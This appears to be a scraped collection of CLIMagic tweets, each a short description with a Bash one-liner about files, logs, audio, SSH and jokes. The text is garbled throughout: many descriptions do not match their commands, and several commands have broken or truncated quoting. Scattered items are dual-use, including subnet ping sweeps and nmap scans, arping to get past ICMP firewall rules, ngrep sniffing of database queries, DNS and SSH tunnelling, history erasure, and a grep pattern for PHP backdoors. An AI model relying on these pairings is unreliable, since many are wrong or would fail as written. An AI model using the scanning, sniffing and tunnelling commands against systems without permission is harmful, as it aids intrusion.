- Record a macro called 'a' that moves down two lines (jj) and then deletes 1 line (dd). Run w/ @a, run 100 times 100@a

```Bash
 vi macro: qajjddq
```

- Change the case (to lowercase) of the first letter E of a filename using brace expansion

```Bash
 mv {E,e}ecummings.txt
```

- List of empty subdirectories of current directory

```Bash
 find . -empty -type d
```

- Like ping, but it uses an ARP request to check, which gets around host firewalls blocking ICMP. Only works on same subnet

```Bash
 arping 10.0.8.5
```

- Check if cert was signed by key

```Bash
 diff <(openssl rsa -in my.key -modulus | grep Modulus) <(openssl x509 -in my.crt -modulus | grep Modulus)
```

- Hide the previous command you just ran and forgot to use space

```Bash
 alias hideprev='history -d $((HISTCMD-2)) && history -d $((HISTCMD-1))'
```

- Show your basic terminal text colors for terminal preferences change

```Bash
 printf "\\e[%dm%d dark\\e[0m  \\e[%d;1m%d bold\\e[0m\\n" {30..37}{,,,}
```

- 1.jpg

```Bash
 curl \'https://t.co/5Eu3Bbah5L\' -o "trip
```

- Use cut to print out columns 1, 5 and 10 through 15 in data.csv and write that to new.csv

```Bash
 cut -d, -f1,5,10-15 data.csv > new.csv
```

- Copy a file using "ionice -c 3" to give it idle priority to reduce load on the system

```Bash
 ionice -c 3 cp vm1.img vm1-clone.img
```

- Find file duplicates in 'dir' recursively based on size and mdsum and log to dupes.txt. Thx @sizeof

```Bash
 fdupes -r dir > dupes.txt
```

- Count syslog hits per minute in your messages log file. Useful for doing quick stats

```Bash
 awk -F: {\'print $1 ":" $2\'} messages |uniq -c
```

- Todo list

```Bash
 todo(){ cd ~/.todo||return 1&& l=$(ls -1t|head -n1)&&t=$(date +%Y%m%d);[[ "$1" == "last" ]]&&cp $l $t; ${EDITOR:-vi} $t;cd -;}
```

- Use the exiv2 EXIF program to rename your jpg files according to their exif date/time data. Thx @mvuets

```Bash
 exiv2 -k -F rename *.jpg
```

- Remove the prefix 'unwanted' from the beginning of each filename with .jpg suffix in CWD

```Bash
 rename 's/^unwanted//' *.jpg
```

- Create a dynamic SOCKS5 proxy on port 8989 using an SSH connection. Some apps can be configured to use this

```Bash
 ssh -D 8989 you@remotehost
```

- Print the day of the year. Can be useful with things like find

```Bash
 date +%j
```

- Pandora music client for the command line. And like many CLI clients, it has more control, features and less bloat

```Bash
 pianobar
```

- linux

```Bash
 What animals live in the snow? Penguins.\rWhat other animals live in the snow? A lot of penguins.
```

- Compare the contents of 2 dirs. Show only 2 columns, each for files unique to the directory

```Bash
 comm -3 <(ls -1 dir1) <(ls -1 dir2)
```

- How many days will it take to transfer 145GiB at 1.35MiB/sec? Use qalc!

```Bash
 qalc "145Gibyte / 1.35(Mibyte/second) to day
```

- Monitor your wireless card signal strength on the screen

```Bash
 watch -n1 cat /proc/net/wireless
```

- Want to write a word doc without the fuss? Make a TXT, Markdown, etc. & convert. Thx @BriceDutheil

```Bash
 pandoc -o proposal.docx proposal.txt
```

- group subdomains by domain. Good use of rev

```Bash
 cat longdomainlist.txt | rev | sort | rev
```

- Compare just the assignment lines of two config files that use = for value assignment

```Bash
 diff <(grep = config.txt) <(grep = config.txt-new)
```

- Show the 10 largest directories at top level along with total usage. All in megabytes

```Bash
 du -cms .[^.]*/ */ | sort -rn | head
```

- On Linux, print out a list of the process IDs that are in the zombie state

```Bash
 ps aux | awk \'{if ($8=="Z") { print $2 }}\'
```

- Mount a CDROM disc from its ISO image file

```Bash
 dd if=/dev/cdrom of=image.iso ; mkdir CDroot ; mount -o loop image.iso CDroot ; cd CDroot
```

- 20 years ago IBM supercomputer Deep Blue defeats Garry Kasparov in chess for the first time

```Bash
 fliptable(){ echo "\xef\xbc\x88\xe2\x95\xaf\xc2\xb0\xe2\x96\xa1\xc2\xb0\xef\xbc\x89\xe2\x95\xaf \xe2\x94\xbb\xe2\x94\x81\xe2\x94\xbb"; }
```

- Write out 20 png format frames from a video starting at 3 minutes, 46 seconds

```Bash
 mplayer -vo png -ss 3:46 -frames 20 stairs.mp4
```

- Move photos with EXIF data to directories by year created/taken. Be verbose

```Bash
 exiftool -v '-Directory<DateTimeOriginal' -d %Y .
```

- Get list of top URLs from all logs combined

```Bash
 zcat access_log*.gz |cat - access_log |awk '{print $7}' |sed 's/\\?.*//' |sort|uniq -c|sort -nr
```

- xkcd https://t.co/qIAPXwY2Xj

```Bash
 These are your father's parentheses. Elegant decorations, for a birthday cake.
```

- A site that helps you build the find options you want to use and now several other common commands

```Bash
 https://t.co/OahUUpr12o
```

- Annoyed by wrapped lines in df output. Try -P to unwrap the lines and piping to column will align the columns

```Bash
 df -P | column -t
```

- Print disk space used on all ext3 or 4 FS in GiB

```Bash
 df -Pl -t ext3 -t ext4 | tail -n+2 | awk '{ sum+=$3 } END { print sum/2**20 }'
```

- $PS1

```Bash
 PS1=
```

- Compress files with xz in PWD according to size, starting with smallest

```Bash
 ls -Sr1 | while IFS=$\'\\n\' read -r file; do xz "$file"; done
```

- For Mar 22nd, print the req fields for hosts from two letter gTLD

```Bash
 fgrep 22/Mar/2015 access_log |awk \'$1~/\\.[a-z][a-z]$/{print $6 " " $7}\'
```

- "}; print $0 " " b;}

```Bash
 awk \'{print $4}\' apache_log|sort -n|cut -c1-15|uniq -c|awk \'{b="";for(i=0;i<$1/10;i++){b=b
```

- Imagine being able to run tail -f /dev/world (You can get the t command for twitter here: https://t.co/wa8QhYYAdE)

```Bash
 t matrix
```

- Do an instant replay on your Roku

```Bash
 curl -d "" http://YourRokuIP:8060/keypress/InstantReplay
```

- CLIMagic video: Epic demo of how I watched Superbowl 46 over a netcat stream

```Bash
 https://t.co/iXz16142fG
```

- Detect 90% of pwn'd PHP code or thereabouts

```Bash
 grep -r eval.*base64 source_code_tree
```

- Run Nyan Cat in your terminal like its 2011

```Bash
 https://t.co/6Q1oHKLrwq
```

- Which days I've worked... By @d1eg0_garc1a

```Bash
 git log --date=short --format="%ci"|awk \'{print $1}\'|uniq
```

##

```Bash
 du -h . | grep "^[0-9\\.]\\+G
```

- Do an apt upgrade and save a copy of the output to a current dated filename

```Bash
 apt-get upgrade | tee upgrade-$( date +%F ).log
```

- Life is too short to run the same command twice

```Bash
 export HISTSIZE=0
```

- Random color per log line

```Bash
 tail -F syslog |while read -r line;do printf "\\033[38;5;%dm%s\\033[0m\\n" $(($RANDOM%255)) "$line";done
```

- Because you can't do this in real life

```Bash
 nohup sleep 8h
```

- Make month histogram of dates of files in current directory

```Bash
 ls -la --full-time |tr -s " " |cut -f6 -d " "|cut -c1-7 | sort | uniq -c
```

- A nice fade slideshow command you can also use

```Bash
 /usr/lib/xscreensaver/glslideshow -pan 20 -duration 20 -delay 0 -fade 5 -clip -window-id
```

- Matrix screensaver background

```Bash
 /usr/lib/xscreensaver/glmatrix -window-id $(xwininfo -int -name "Desktop" |awk \'/Desktop{print $4}\')
```

- Move current year pics to 2015 directory

```Bash
 find . -maxdepth 1 -daystart -type f -name '*.jpg' -mtime -$( date +%j ) -exec mv -v {} 2015/ \\;
```

- Learn a command on each new shell open

```Bash
 echo \'man $(ls /usr/bin | shuf -n 1)| sed -n "/^NAME/ { n;p;q }"\' > > ~/.bashrc
```

- Show directory size and sort by human readable amount (MB, GB, etc.). Requires GNU sort for -h option

```Bash
 du -sh */ | sort -h
```

- list top 50 404's in descending order

```Bash
 awk \'$9 == "404" {print $7}\' access.log |sort|uniq -c|sort -rn| head -n 50
```

- iodine is a client and server that allow you to tunnel IP traffic over DNS, bypassing many firewalls, etc

```Bash
 https://t.co/Uxzf93qAkC
```

- Edit a file on a remote server using vim from your local *nix desktop

```Bash
 vim scp://user@server1//etc/httpd/httpd.conf
```

- And you probably haven't heard one of these in a while

```Bash
 play -n synth sine 480 sine 620 remix 1-2 fade 0 0.5 delay 0.5 repeat 5
```

- With this command you can generate a U.S. dial tone using sox play

```Bash
 play -n synth sine A sine F remix 1-2 fade 0 5
```

- @stormdragon2976 constructed this command that imitates the sound of an old rotary phone using espeak

```Bash
 https://t.co/sDwF5A448q
```

- Find any files or directories on your system that are suid or sgid. Older versions of find can try -perm +u+s

```Bash
 find / -perm /+s -ls
```

- Quick popup notification command after 3 minutes

```Bash
 sleep 3m; xmessage -nearmouse "Your tea is ready
```

- Get a list of all files last modified in 2013. Useful for passing to xargs or while loop

```Bash
 find . -printf "%TY %p\\n" | grep ^2013
```

- List all rpm packaged files in /var/log by what rpm they belong to

```Bash
 rpm -qa --filesbypkg | grep " /var/log/
```

- Say hello using a nice voice

```Bash
 wget -q -O- -U Mozilla "https://t.co/FtVcqALluf\\.com/translate_tts?q=hello&tl=en"|mpg123 -q -
```

- Create the "Matrix effect" in your terminal window

```Bash
 https://t.co/XoOtJkj06I
```

- find all files larger than 100MB and display their human readable size

```Bash
 find / -size +100M -exec du -h {} \\;
```

- You can use the bc command to convert base 10 numbers to base 16 (hexadecimal). Tip: Specify obase first

```Bash
 echo "obase=16;ibase=10;40" | bc
```

- Convert hexadecimal number 28 to decimal 40. Can also do echo $((16

```Bash
 echo $((0x28))
```

- Ever edit a file as a normal user that is owned by root. This vim command will allow you to overwrite it with root perms

```Bash
 :w !sudo tee %
```

- Turn a Unix epoch time back into a human readable date. Feature of GNU date

```Bash
 date -d @192179700
```

- Play alarm.wav once site is back

```Bash
 while ! curl -m 10 http://www.example\\.com/ ; do echo still down ; sleep 1m ; done ; play alarm.wav
```

- CLI generated dubstep. Thx @Butter_Tweets

```Bash
 while :; do echo wub wub wub | espeak --stdout | play - pitch -400 bend .3,-600,.3 ; done
```

- groundhog0day

```Bash
 The groundhog saw /etc/shadow, the rainbows are next. Winter is over.
```

- sshfs is a nice util that uses FUSE and SSH to mount a remote directory as a local one

```Bash
 sshfs user@remotehost:/remotedir mydir
```

- 1

```Bash
 You probably learned SSH from me. I wrote the top ssh tutorial for the past 15 years. Search for ssh tutorial. Its the Suso one, usually
```

- Apparently according to testing, this is the fastest way to delete millions of small files

```Bash
 rsync -a -delete empty/ foo/
```

- You started a program, but now want it to notify you when its done

```Bash
 <ctrl-z > bg ; wait %1 ; echo "done" | mail -s "done" you@example.com
```

- Download playlist vids

```Bash
 youtube-dl --max-quality 37 --title --playlist-start=1 --playlist-end=10 --ignore-errors youtube-playlist-url
```

- CLIMagic video: Use comment characters in commands to add meta info to commands

```Bash
 https://t.co/k9WE4wZycs
```

- Suspend and reattach a process to screen

```Bash
 longcmd ; [Ctrl-Z] ; bg ; disown ; screen ; reptyr $( pidof longcmd )
```

- By @seidler2547

```Bash
 git log --author=$USER --format="- %B" --since=-7days --reverse |mail -s "What I\'ve done this week" boss@company\\.com
```

- I find brace expansion useful for renaming files. This cmd expands to "mv Picture.jpg Picture-of-my-cat.jpg"

```Bash
 mv Picture{,-of-my-cat}.jpg
```

- mnt iPad filesystem. Thx @timothyjones

```Bash
 apt-get install ifuse", "ifuse /media/iPad" and "cp -v /media/iPad/DCIM/100APPLE/IMG*MOV /target
```

- Use the exiv2 EXIF program to rename your jpg files according to their exif date/time data

```Bash
 exiv2 -k -F rename *.jpg
```

- tail log & highlight errors (if your grep supports --color) Thx @kvegh

```Bash
 tail -f foo.log|egrep --line-buffered --color=auto 'ERROR|WARN|$'
```

- Pretend that you're on a starship

```Bash
 play -n -c1 synth whitenoise band -n 100 20 band -n 50 20 gain +30 fade h 1 86400 1
```

- Extract MP3 from FLV function. Thx @tweetygeekyhbar

```Bash
 extr_mp3(){ ffmpeg -i $1.flv -f mp3 -ar 44100 -ac 2 -ab 192k -y -acodec copy $1.mp3; }
```

- Mark Zuckerburg could've saved a billion if he knew about ImageMagick. (Instagram)

```Bash
 convert +level-colors Firebrick, me.jpg oldme.jpg
```

- Show the query and results of 'select' queries going to your mysql server. Won't work on socket conns

```Bash
 ngrep -d eth0 -i 'select' port 3306
```

- Show what processes are using port 80 either locally or remotely. Need to be root for unowned processes

```Bash
 lsof -i TCP:80
```

- Wrap the lines of draft.txt at 72 characters wide, doing so at spaces, not middle of word (-s)

```Bash
 fold -w 72 -s draft.txt > newdraft.txt
```

- Professional development: Learn vim while playing an adventure game

```Bash
 https://t.co/wGMlnaXJYp
```

- Blink eth0's LED so you can find it in the rat's next of server cables. Ctrl-C to stop

```Bash
 ethtool -p eth0
```

- Save a url for reading later when you "have time". Also try https://t.co/8R1vy0yrRR

```Bash
 saveurl() { cat > /dev/null; }
```

- Display top RAM using processes. Browser is probably

```Bash
 ps aux|tail -n+2 |sort -nrk4 |head -$(($(tput lines)-1)) |cut -c 1-$(tput cols)
```

- Remote intercom system. "Kent, this is God!"

```Bash
 rec -t wav - | ssh remotehost play -t wav -
```

- Quickly find the largest 5 files in the CWD tree without crossing filesystem boundaries

```Bash
 find . -xdev -ls | sort -n -k 7 | tail -5
```

- Quick and easy way to make a mirror of a website

```Bash
 wget -m http://www.example\\.com/
```

- Start a web service on port 8000 that uses the current directory as its document root

```Bash
 python -m SimpleHTTPServer
```

- Automatically installs your public key to the remote host (this is included in the openssh package)

```Bash
 ssh-copy-id 'user@remotehost'
```

- restore a

```Bash
 pv bigdump.sql.gz | gunzip | mysql
```

- Show the TCP and UDP ports being listened on and if you're root, also show the process associated, user, etc

```Bash
 netstat -lepunt
```

- Make slideshow from *.jpg

```Bash
 for p in *.jpg; do ffmpeg -loop_input -f image2 -i $p -t 3 -r 4 -s 1080x720 -f avi - > > slides.avi; done
```

- Your Linux laptop says ESSID names while you drive around

```Bash
 while :;do iwlist wlan0 scan |awk -F\\" \'/ESSID/{print $2}\' |espeak;done
```

- Make local webserver available via remoteserver:8080. Req. GatewayPorts yes on sshd

```Bash
 ssh -R *:8080:localhost:80 remoteserver
```

- Quickly scan network without using nmap, etc

```Bash
 for i in 172.16.0.{1..254};do (ping -c1 $i > /dev/null && echo $_) &done > pinged-hosts
```

- CLIMAGIC video: Using awk or numsum to sum up numbers in df output

```Bash
 https://t.co/kpb7imeVxs
```

- Quickly list the directories that are two levels down without having to do something more complex with 'find'

```Bash
 ls -ld */*/
```

- Search for available python packages through yum, but only show lines for packages starting with python

```Bash
 yum search python | grep ^python
```

- Scan your internal network for hosts listening on TCP port 22 (SSH)

```Bash
 nmap --open -p T:22 192.168.1.0/24
```

- Turn a mono channel recording of talking into a small mp3

```Bash
 lame -b 32 -m m --bitwidth 8 podcast.wav podcast.mp3
```

- Delete messages from Jan 20th in the postfix queue

```Bash
 mailq |grep " Jan 20 " |awk {\'print $1\'} |xargs -n 1 postsuper -d
```

- Make box around text. By @bartonski

```Bash
 function box(){ t="$1xxxx";c=${2:-=}; echo ${t//?/$c}; echo "$c $1 $c"; echo ${t//?/$c}; }
```

- Make a quick rot13 translation quick reference table

```Bash
 echo {a..z} ; echo {n..z} {a..m}
```

- Run a command "unreliably". Useful in cron. Remember to use \\% instead of % if using in crontab

```Bash
 [ $(( $RANDOM % 2 )) -eq 0 ] && command
```

- Display top bandwidth hogs on website

```Bash
 awk \'{a[$1] += $10} END {for (h in a) print h " " a[h]}\' access_log | sort -k 2 -nr | head -10
```

- CLIMagic video: Tar command tutorial

```Bash
 https://t.co/Jd8hP5clg0
```

- This will show a count of all lines that have more than 1 copy. So only show the duplicates. (-d)

```Bash
 uniq -cd popular.txt
```

- Show the mail servers that mail destined to example\xe2\x80\x8b.com is going to go. +short for less info than default

```Bash
 dig +short MX example\\.com
```

- Split a file into 500 line files called splitfile-xaa, splitfile-xab, etc. Useful for variety of things

```Bash
 split -l 500 largefile splitfile-
```

- List the filenames that don't contain the pattern specified

```Bash
 grep -L pattern *
```

- Go directly to the crontab man page that is in chapter 5 of the unix manual pages. Some topics have multiple man pages

```Bash
 man 5 crontab
```

- Use rev twice to get around limitation of cut not being able to truncate end of a string

```Bash
 echo test | rev | cut -c 2- | rev
```

- Split a file into multiple using an empty line as the split point. {*} means do this until the end

```Bash
 csplit sections.txt '/^$/' {*}
```

- Print out the file requested for CLF log entries with HTTP 404 status code

```Bash
 awk '$10==404 {print $7}' access_log
```

- On Linux and others, display the inodes used per filesystem. Useful for determining how long it takes to backup or search the fs

```Bash
 df -i
```

- Show a 3 month view (before, current, after) in cal

```Bash
 cal -3
```

- Find which Debian package the notify-send program is included with - > libnotify-bin

```Bash
 dpkg -S $( which notify-send )
```

- Pass the output of which (showing path to lspci) into rpm's -qf, which tells you the pkg

```Bash
 rpm -qf $( which lspci )
```

- Do an rsync and limit the bandwidth used to about 200 KBytes/sec. Useful on shared or slow links

```Bash
 rsync --bwlimit=200 src dest
```

- Determine what lines two different files have in common. The comm program requires sorted files

```Bash
 comm -12 <(sort names1) <(sort names2)
```

- Make thumbnails of images IMG_3000.JPG - IMG_3499.JPG

```Bash
 for i in IMG_3[0-4]*.JPG ; do convert -quality 60 -geometry 300 $i thumbs/$i ; done
```

- Join the splits back together

```Bash
 cat split-xaa split-xab split-xac > rejoinedlargefile
```

- Split a file called largefile into 1 gigabyte pieces called split-xaa, split-xab, split-xac

```Bash
 split -b 1G verylargefile split
```

- Spice up your excessive usage of [Ctrl-C]. Needs ack or ack-grep. For @trifero

```Bash
 trap "echo;ack-grep --bar | sed \'y/ge/ta/\'" SIGINT
```

- poor man's file serve. Use nc serverhost 1234 > output.txt to retrieve file from remote host. NAT bugs this

```Bash
 nc -q1 -lvp 1234 < file.txt
```

- Bean counter

```Bash
 alias coffee='VALUE=$( cat ~/.cupsocoffee ) ; VALUE=$(( $VALUE + 1 )); echo $VALUE > ~/.cupsocoffee ; echo $VALUE'
```

- List the 20 largest files or folders under the current working directory

```Bash
 du -ma | sort -nr | head -n 20
```

- Find out if any duplicate image files exist in the current directory

```Bash
 shasum *.jpg | awk {\'print $1\'} | sort | uniq -c | grep -v " 1
```

- This will run ls without using any alias called ls that might be in place. You can do this with any command

```Bash
 \\ls
```

- Show Linux distro release information or die trying

```Bash
 lsb_release -a || cat /etc/redhat-release
```

- Look at the full year calendar for 2013 and 2014 side by side. (Requires term width > 135)

```Bash
 paste <(cal 2015) <(cal 2016)
```

- |^$" httpd.conf

```Bash
 egrep -v "^
```

- Count the number of web server processes running. Or use (pgrep -c httpd)

```Bash
 ps auxw | grep "[h]ttpd" | wc -l
```

- trim output data width of file to the exact width of your terminal

```Bash
 cut -c 1-$COLUMNS file
```

- Engage lazy mode

```Bash
 for i in {1..10} ; do sleep $(( $RANDOM % 3600 + 1800 )) ; twitter-queueposter.py ; done
```

- Space usage of directories only (This was the very first CLIMagic command posted on December 15th, 2009)

```Bash
 du -sh */
```

- (Calmer) Snow in your terminal

```Bash
 https://t.co/mPoGSm9FTn
```

- Snow storm in the terminal

```Bash
 while true;do N=$(($RANDOM % $COLUMNS));for i in $( seq 1 $N );do echo -n " ";done;echo \\*;done
```

- You might want to use this command to flip your X display for the next one. xrandr -o normal flips back

```Bash
 xrandr -o inverted
```

- WarOnFTP https://t.co/yfjUKl0Goa

```Bash
 yes NO
```

- Tron lightcycles in the terminal or Etch-a-sketch. Take your pick

```Bash
 https://t.co/Kvo0jd2eTK
```

- Graph of the history of Unix and its derivatives. Last updated October 2015 (yes its still updated)

```Bash
 https://t.co/d8AmdxPY25
```

- Show IPv4 and IPv6 addresses per interface in Linux. Thx to all in

```Bash
 echo addr show|ip -o -b -|cut -d' ' -f2,7
```

- reptyr can be used to reattach a program on another tty to the current tty so you can transfer it into screen/tmux

```Bash
 reptyr <pid >
```

- Sometimes I like to paste data to grep on stdin, problem is output can interweave with the input. Use sponge + Ctrl-D

```Bash
 sponge | grep needle
```

- In Mutt, pipe a message (press |) through this command to decode and view a base64 encoded body

```Bash
 sed -n '/^$/,$p' | base64 -d | less
```

- Encapsulate UDP packets in a TCP stream so it can be tunneled through an SSH tunnel, etc

```Bash
 socat -v UDP-LISTEN:8161,fork TCP:localhost:8161
```

- Use brace expansion to easily specify a list of 8 interfaces to listen on. p1p1 - p2p4

```Bash
 tshark -ip{1,2}p{1..4} -w 20160115.pcap
```

- Playback a voicemail at 10 decibels louder and 50% faster without affecting pitch. Req. sox package

```Bash
 play msg0114.WAV vol 10 dB tempo 1.5
```

- Get data and timestamp til 40X status

```Bash
 while :;do wget http://example\\.com/exposed -O exposed-$(date +%Y%m%d%H%M%S)||break;sleep 1h;done
```

- Rename all single leading digit flac files so that they have a padding 0 for easier sorting

```Bash
 rename -v 's/^([0-9])_/0\\1_/' *.flac
```

- Brace expansion quickly appends the devel pacakge as well to your list

```Bash
 yum install package-with-long-name{,-devel}
```

- Poor folk's multi music album player

```Bash
 echo "Listen to which album?" ; select album in */ ; do mplayer "$album"/* ; done
```

- Actually this might work better for your .bashrc. Shorter and more fun. Thx @nervengiftlabs and @Schlumpf23_v3

```Bash
 cowsay $(fortune -s)
```

- Dump your paste clipboard to hexdump for character by character investigation of what you just copied

```Bash
 (xsel -b || pbpaste) |hexdump -c
```

- Pave the road

```Bash
 while true; do for i in 02E{{9..5},{6..8}}; do printf "\\u${i}O=o >";sleep 0.09;printf "\\b\\b\\b\\b\\b";done;printf "_";done
```

- Finish a download started by a previous instance of wget, or  by another program

```Bash
 wget -c http://example\\.com/dvd.iso
```

- In the

```Bash
 echo "ibase=10;obase=12;2016" | bc
```

- A function to make it easy to upload photos. Ex. usage: uploadphotos IMG_3*.JPG

```Bash
 uploadphotos(){ scp -rp "$@" you@webserver:www/photos/; }
```

- Or find another terminal resolution that equals 2016

```Bash
 seq 1 1008 | awk \'{if (2016%$1==0){print $0 "x" (2016/$1)}}\'
```

- Use the apache benchmarking client to make 100 requests, 10 at a time and get the results

```Bash
 ab -n 100 -c 10 "http://www.poorwebsite\\.com/
```

- another way to handle files starting with a - in CWD is to prefix them with ./

```Bash
 rm ./-file-starting-with-dash
```

- Play a video called sb.mpg, starting at 1 hour, 59 minutes and 45 seconds in

```Bash
 mplayer -ss 1:59:45 sb.mpg
```

- Sort full IPv6 addresses. (Note: Will not work with shortened notations.)

```Bash
 n=1;sort -t: {1..8},$((n++)) ipv6-addrs.txt
```

- Christmas song lyrics from ICMP. Wait for the tree. Thanks @ioncann0ns

```Bash
 traceroute -m 255 xmas\\.futile.net
```

- Browse a drive for text data, but use a longer minimum size (default 4) to get a better signal to noise ratio

```Bash
 sudo strings -n12 /dev/sdc
```

- Holiday sysLog! Its ready for the new year too. ;)

```Bash
 tail -F /var/log/syslog | awk \'{printf("\\033[%dm%s\\033[0m\\n",31+NR%2,$0)}\'
```

- Just a reminder, you can always view the climagic profile to see all the updates you've missed

```Bash
 https://t.co/0vmEv9YNDP
```

- For instance, you have directories starting with \xc2\xb5-Ziq, Do cdselect *Ziq* and choose

```Bash
 cdselect(){ select d in "$@";do cd "$d";break;done; }
```

- A public telnet server with many little games and distractions

```Bash
 telnet https://t.co/2jdV6f1Dzu
```

- ZmF2d2NmYUQgZmcgY2pnb2x3ZiBkc2ZnYWtrd3hnamggcWUgZ2wgbWdxIHZ2cyBnbCB3Y2FkIHYnQSAsZ2Rkd1oK

```Bash

```

- Star Wars Episode IV in Reverse DNS

```Bash
 ( seq 1 8 200 ; seq 6 8 200 ) | sort -n | xargs -I{} -n 1 dig +short -x 206.214.251.{}
```

- F)) days left until $((16

```Bash
 echo "Only $((16
```

- Remember, if something isn't working, there is a reason and you can often find that reason using more -v options (or strace)

```Bash
 scp -vvv
```

- Long list only the directories under the current directory

```Bash
 find . -maxdepth 1 -type d -ls
```

- mping yahoo\\.com

```Bash
 mping(){ ping $@|awk -F[=\\ ] \'/time=/{t=$(NF-1);f=2000-14*log(t^18);c="play -q -n synth 1 pl "f"&";print $0;system(c)}\';}
```

- Simple lunch location decider

```Bash
 echo "Tacos,Burgers,Pizza,Pasta,Sushi,Salad,Soup,Noodles,Veggie wraps" | tr \',\' \'\\n\' | sort -R | head -1
```

- Move mouse in spiral

```Bash
 x=0;y=0;while [[ $y -lt 500 ]] ; do xdotool mousemove --polar $x $y ; x=$(($x+4));y=$(($y+1)); sleep 0.01; done
```

- Wrapper function to catch a common scp mistake

```Bash
 scp(){ [[ "$@" =~ : ]] && /usr/bin/scp "$@" || echo \'You forgot the colon!\'; }
```

- Run multiple times and this will demonstrate how sort -R is different from shuf

```Bash
 printf ".\\n.\\n.\\n.\\n.\\n.\\na\\na\\nb\\nb\\nb\\nc\\nc\\n" | sort -R
```

- Pick 5 random lines (names in this case) from a file called names.txt

```Bash
 shuf -n5 names.txt
```

- Connections to tcp localhost:9909 will be made to 192.168.1.1:80 via SSH tunnel to home. Thx @mralext20

```Bash
 ssh -L 9909:192.168.1.1:80 home
```

- Random human like pauses

```Bash
 acthuman(){ h=$(date +%H);case $h in 8|12|17) sleep 1h;; 22|23|0) sleep 8h;; *) sleep $((5+$RANDOM%60));; esac; }
```

- Find any files that start with a -. These can end up setting options to commands when you do stuff like du -sh *

```Bash
 sudo find / -name '-*'
```

- Function to help with an emoji. Thx @supercow

```Bash
 shrug(){ echo -n "\xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf" | (xsel||pbcopy);echo "\xc2\xaf\\_(\xe3\x83\x84)_/\xc2\xaf copied to your clipboard"; }
```

- THX-like sound. play is from the sox package

```Bash
 play -q -n synth sq F2 sq C3 remix - fade 0 5 .1 norm -4 bend 0.5,2477,3 fade 0 5 0.8
```

- Put the sh back into it

```Bash
 cat /bin/sh > it
```

- This will also show you a process tree, but is more terse in the information it provides

```Bash
 pstree
```

- Show the process in a tree format, search for gzip and show 8 lines of pre-match context to see its family

```Bash
 ps auxwf | grep -B8 "[g]zip
```

- Then do kill -USR1 PIDOFBASH to flip the state of the variable v. Could be useful in loops, turn on/off a print

```Bash
 trap 'v=$((! v));' SIGUSR1
```

- Minecraft make stone floor commands

```Bash
 for x in -{630..599}; do for z in -{115..130}; do echo "/setblock $x 60 $z minecraft:stone";done;done
```

- Remove the previous word on the command line (before the cursor). This is highly useful when reusing old commands

```Bash
 <Ctrl-w >
```

- This is usually equivilent to running 'clear'.  Its usually quicker and doesn't leave the command in your command line history

```Bash
 <Ctrl-l >
```

- Incremental undo of command line edits. Ctrl-- works the same and Ctrl-? sometimes works as well, although its not documented

```Bash
 <Ctrl-_ >
```

-  >

```Bash
 <Meta-
```

- Insert the last argument from the previous line in the command history into the current line. Different from !$

```Bash
 <Meta-. >
```

- Move your cursor to the end of the line. Faster than holding down right arrow

```Bash
 <Ctrl-e >
```

- Move your cursor to the beginning of the line. Faster than holding down left arrow. In screen, you need to press <Ctrl-a a >

```Bash
 <Ctrl-a >
```

- Reverse search through your command history for 'string'. Press Ctrl-r again to continue searching backwards. ESC when done

```Bash
 <Ctrl-r >string
```

- Takes you back to the previous directory you were in. Good to know if you don't already

```Bash
 cd -
```

- (With no arguments) Takes you back to your home directory

```Bash
 cd
```

- description. The

```Bash
 Just a reminder about the format of climagic tweets: command
```

- Much better than https://t.co/Qgan2tKJEI where anything goes

```Bash
 https://t.co/mwmevXw1ku
```

- List the cached ssh host key fingerprint for 10.0.0.23

```Bash
 ssh-keygen -F 10.0.0.23 -l
```

- Thx @mitchell486

```Bash
 (find . -name \\*.git 2 >/dev/null|grep -oP \'^(.*)(?=\\/\\.git$)\'|while read l;do pushd "$l";git status;popd;printf "\\n";done)
```

- SC15

```Bash
 I'm at SuperComputing 2015 in Austin, Texas today. If you are too, let me know or look for the climagic ~$ t-shirt.
```

- Find primes using PCRE. https://t.co/rnfOtboabv

```Bash
 n=0;while : $((n++));do printf "%0${n}d"|grep -qP "^0?$|^(00+?)\\1+$" ||echo $n;done
```

- SC15

```Bash
 I'll be at SuperComputing 2015 in Austin, Texas this week. If you will be there too, let me know and we can meet up.
```

- Globe animation

```Bash
 oneworld=$(curl -s http://artscene.textfiles\\.com/vt100/globe.vt);while :;do  pv -L4242 -q  < "$oneworld";sleep .1;done
```

- French Flag

```Bash
 t=$(($(tput cols)/3));for FR in $(seq $(tput lines));do printf "\\e[44m%${t}s\\e[47m%${t}s\\e[41m%${t}s\\e[0m\\n";done
```

- French Flag

```Bash
 t=$(($(tput cols)/3));for FR in $(seq $(tput lines));do printf "\\e[44m%${t}s\\e[47m %${t}s\\e[41m%${t}s\\e[0m\\n";done
```

- GeoIP traceroute by @xjjo

```Bash
 traceroute linux.fi |awk \'($2~/[.]/){"geoiplookup "$2 |getline g;$0=sprintf("%-64s %s", $0, g)}{print}\'
```

- Show years with 3 Fri 13ths

```Bash
 printf "1800-01-13 +%s months\\n" {0..4800} |date -f - |grep ^Fri |awk \'{print $NF}\' |uniq -c |grep " 3
```

- Find all Friday 13ths in the next 20 years. Thx @xjjo

```Bash
 printf "now +%s months\\n" {0..240}| date -f - |grep ^Fri
```

- See an earlier version date for TBL's WWW proposal

```Bash
 curl -sI http://www.w3\\.org/History/1989/proposal.rtf |grep Last-Modified
```

- Put lines 5000 through 7500 from a large compressed SQL file into a new file

```Bash
 zcat dump.sql.gz | sed -n '5000,7500p' > newdump.sql
```

- A similar top uniq, which defaults to reverse numeric sort of count if no options given

```Bash
 topuniq(){ sort | uniq -c | sort ${@:--rn} ; }
```

- Make a function to shorten this commonly used command line pattern & allow for options for final sort

```Bash
 sus(){ sort | uniq -c | sort $@; }
```

- Check how similar code submitted with a resume is to the original code you found online. :-(

```Bash
 diff resumecode.py origcode.py | less -S
```

- Show services that are set to start up automatically on a systemd based system

```Bash
 systemctl list-unit-files | grep enabled
```

- mps-youtube is a newish TUI interface for Youtube. Thx @rkfb

```Bash
 https://t.co/YsVv423nMx
```

- Send 123456789 in a udp packet to the lights at https://t.co/2ECImTvDRH

```Bash
 echo {1..9} | tr -d " " > /dev/udp/lights.climagic.com/45444
```

- Sending new RSS entries to email Thx @schtobia

```Bash
 rsstail -u $FEEDURL -n 50 | while read line; do mail -s "FeedUpdate" $user  < "$line"; done
```

- Don't trust your own abilities to come up with a clever way of generating passwords (or an accidental one)

```Bash
 pwgen 12
```

- Learn to use vim. Happy Birthday vim

```Bash
 vimtutor
```

- In bash, this will leave history, ls, date, w and man whatever out of your command history

```Bash
